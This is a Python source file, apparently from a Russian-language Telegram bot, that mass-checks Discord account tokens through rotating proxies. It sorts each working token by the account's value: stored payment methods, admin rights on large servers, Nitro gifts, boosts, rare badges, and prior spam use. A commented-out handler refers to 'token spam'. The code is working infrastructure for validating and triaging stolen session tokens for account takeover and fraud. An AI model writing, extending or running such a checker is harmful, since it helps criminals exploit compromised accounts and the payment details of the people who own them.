import asyncio
import datetime
import math
import random
from typing import List

from channels.db import database_sync_to_async
from django.utils import timezone
from django.core.cache import cache
from telegram import ParseMode

from proxy_manager.models import Proxy
from proxy_manager.proxy_async_throttler import ProxyAsyncThrottler
from tgbot.handlers.sub_only import static_text
from tgbot.handlers.sub_only.request_manager import RequestManager
from tgbot.handlers.utils import keyboard
from tgbot.handlers.utils.send_document import send_document
from tgbot.models import User
from tgbot.handlers.sub_only.discord_api import DiscordApi


async def update_message_loop(author_user_tg_id, token_list_len, time_started, message_id):
    # while we know that there isn't enough tokens checked to send results, we update the message
    from tgbot.dispatcher import bot

    while cache.get(f'checking_tokens_{author_user_tg_id}', 0) < token_list_len - 5:
        await asyncio.sleep(random.randint(2, 6) + random.random())
        time_spent = str((timezone.now() - time_started).total_seconds()).split('.')
        time_spent = time_spent[0] + '.' + time_spent[1][:2]
        tokens_checked_so_far = cache.get(f'checking_tokens_{author_user_tg_id}')
        bot.edit_message_text(
            message_id=message_id,
            chat_id=author_user_tg_id,
            text=f'✅ В прогрессе ({time_spent} секунд)...\n'
                 f'Чекнул <b>{tokens_checked_so_far}/{token_list_len}</b> токенов <b>({str(tokens_checked_so_far / (timezone.now() - time_started).total_seconds()).split(".")[0] + "." + str(tokens_checked_so_far / (timezone.now() - time_started).total_seconds()).split(".")[1][:2]} токенов в секунду)</b>!!\n\n'
                 f'⏳ Последнее изменение: {datetime.datetime.now().strftime("%X")}',
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard.cancel_message_button_keyboard(f'cancel_token_checker_{author_user_tg_id}')
        )


async def end_token_check_message(result_dict, author_user_tg_id, time_started, message_id, token_list_len, len_token_list, len_actual_token_list_list):
    """ send all the documents + edits the process message (that it's done) """
    from tgbot.dispatcher import bot
    for k, v in result_dict.items():
        if not v:
            continue
        if k == 'with_badges':
            for k_badge, v_badge in result_dict['with_badges'].items():
                if v_badge is not None:
                    send_document(author_user_tg_id, '\n'.join(v_badge), f'{k}.txt',
                                  f'<b>{static_text.dict_name_to_str(k)} ({k_badge})</b>')
            continue
        send_document(author_user_tg_id, '\n'.join(v), f'{k}.txt', f'<b>{static_text.dict_name_to_str(k)}</b>')
        await asyncio.sleep(0.1)


    time_spent = str((timezone.now() - time_started).total_seconds()).split('.')
    time_spent = time_spent[0] + '.' + time_spent[1][:2]

    # editing final message
    bot.send_message(
        # message_id=message_id,
        chat_id=author_user_tg_id,
        text=static_text.token_checking_task_done(
            len(result_dict['valid']), len(result_dict['invalid']),
            len_token_list,
            token_list_len - len_actual_token_list_list, len(result_dict['spammed']), len(result_dict['empty']),
            len(result_dict['clean']), len(result_dict['with_payments']),
            len(result_dict['with_admin_on_big_server']),
            len(result_dict['with_badges']), len(result_dict['with_boosts']), len(result_dict['xbox_codes']),
            len(result_dict['nitro_gifts']), time_spent
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard.main_keyboard_by_user_status(
            await database_sync_to_async(User.get_user_by_username_or_user_id)(author_user_tg_id)
        )
    )


async def process_res_dict(list_of_res):
    result_dict = {}
    for res in list_of_res:
        if result_dict == {}:
            result_dict = res
            continue
        for k, v in res.items():
            if k == 'with_badges':
                for badge_name, token in result_dict[k].items():
                    if result_dict['with_badges'].get(badge_name) is None:
                        result_dict['with_badges'][badge_name] = []
                    result_dict['with_badges'][badge_name].append(token)
                continue
            result_dict[k] += v
    return result_dict


async def token_checker_async_task(token_list: List[str], author_user_tg_id: int):
    """ checks all the tokens given in :param: token_list """
    from tgbot.dispatcher import bot
    _unique_token_dict = {}
    token_list_len = 0
    for token in token_list:
        if len(token) != 59:
            continue
        xd = token.split('.')[0]
        if not _unique_token_dict.get(xd):
            _unique_token_dict[xd] = []
        _unique_token_dict[xd].append(token)
        token_list_len += 1
    actual_token_list_list = list(_unique_token_dict.values())

    # proxy_list = await database_sync_to_async(Proxy.get_valid_proxy_list)(1383319939)
    proxy_list = await database_sync_to_async(Proxy.get_valid_proxy_list)(author_user_tg_id)
    message_id = bot.send_message(
        chat_id=author_user_tg_id,
        text=f'<code>Запускаю потоки для чекера токенов...</code>',
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard.cancel_message_button_keyboard(f'cancel_token_checker_{author_user_tg_id}')
    ).message_id
    cache.set(f'checking_tokens_{author_user_tg_id}', 0)

    # starting request manager
    rm = RequestManager(proxy_list)

    # starting all the shitstorm to send in request
    gather_object = asyncio.gather(*(token_checker_function(i, author_user_tg_id) for i in actual_token_list_list))
    time_started = timezone.now()
    bot.edit_message_text(
        message_id=message_id,
        chat_id=author_user_tg_id,
        text=f'✅ Запуск прочека (0.00 секунд)...\n'
             f'Чекнул <b>0/{token_list_len}</b> токенов <b>(0.00 токенов в секунду)</b>!\n\n'
             f'⏳ Последнее изменение: {timezone.now().strftime("%X")}',
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard.cancel_message_button_keyboard(f'cancel_token_checker_{author_user_tg_id}')
    )

    # starts the message updater
    message_update_loop_task = asyncio.create_task(update_message_loop(author_user_tg_id, token_list_len, time_started, message_id))
    result_list = await gather_object  # awaits all the token checks
    await message_update_loop_task  # stops the message updater
    cache.delete(f'checking_tokens_{author_user_tg_id}')  # deletes useless token check
    processed_result_dict = await process_res_dict(result_list)  #
    await end_token_check_message(processed_result_dict, author_user_tg_id, time_started, message_id, token_list_len, len(token_list), len(actual_token_list_list))


async def token_checker_function(token_list_with_same_start: List[str], author_user_tg_id: int):
    token_dict = {'valid': [], 'empty': [], 'with_payments': [], 'with_admin_on_big_server': [],
                  'with_badges': {}, 'with_boosts': [], 'invalid': [], 'spammed': [],
                  'clean': [], 'xbox_codes': [], 'nitro_gifts': []}

    cache_updated_counter = 0
    for token in token_list_with_same_start:
        # try:
        discord_account = DiscordApi(token)
        if not await discord_account.validate():
            token_dict['invalid'].append(token)
            cache_updated_counter += 1
            cache.set(
                f'checking_tokens_{author_user_tg_id}',
                cache.get_or_set(f'checking_tokens_{author_user_tg_id}', 0) + 1
            )
            continue
        info = await discord_account.get_info()
        if not info:
            token_dict['invalid'].append(token)
            cache_updated_counter += 1
            cache.set(
                f'checking_tokens_{author_user_tg_id}',
                cache.get_or_set(f'checking_tokens_{author_user_tg_id}', 0) + 1
            )
            continue
        token_dict['valid'].append(token)
        if info['payments']:
            token_dict['with_payments'].append(token)
        if info['has_admin_in_big_guilds']:
            token_dict['with_admin_on_big_server'].append(token)
        if info['has_unused_boosts']:
            token_dict['with_boosts'].append(token)
        if info['gifts']:
            token_dict['nitro_gifts'].append(token)
        if info['dm_count'] and info['dm_count'] <= 10:
            token_dict['empty'].append(token)
        if info['are_spammed_through']:
            token_dict['spammed'].append(token)
        else:
            token_dict['clean'].append(token)
        if info['rare_flags']:
            for badge in info['rare_flags']:
                if token_dict['with_badges'].get(badge) is None:
                    token_dict['with_badges'][badge] = []
                token_dict['with_badges'][badge].append(token)
        cache.set(
            f'checking_tokens_{author_user_tg_id}',
            cache.get_or_set(f'checking_tokens_{author_user_tg_id}', 0) + len(
                token_list_with_same_start) - cache_updated_counter
        )
        # we break from this loop since we found the working token amongst the list of same account tokens
        break
        # except Exception as e:
        #     from tgbot.dispatcher import bot
        #     tb_list = traceback.format_exception(None, e, e.__traceback__)
        #     message = (
        #         f'An exception was raised while <b>DOING TOKEN SPAM!!!</b>\n'
        #         f'token: {token}'
        #         f'<pre>{html.escape("".join(tb_list))}</pre>'
        #     )
        #     bot.send_message(
        #         chat_id=settings.TELEGRAM_LOGS_CHAT_ID,
        #         text=message,
        #         parse_mode=ParseMode.HTML
        #     )
        #     raise ValueError('yeah debug shit')
    return token_dict
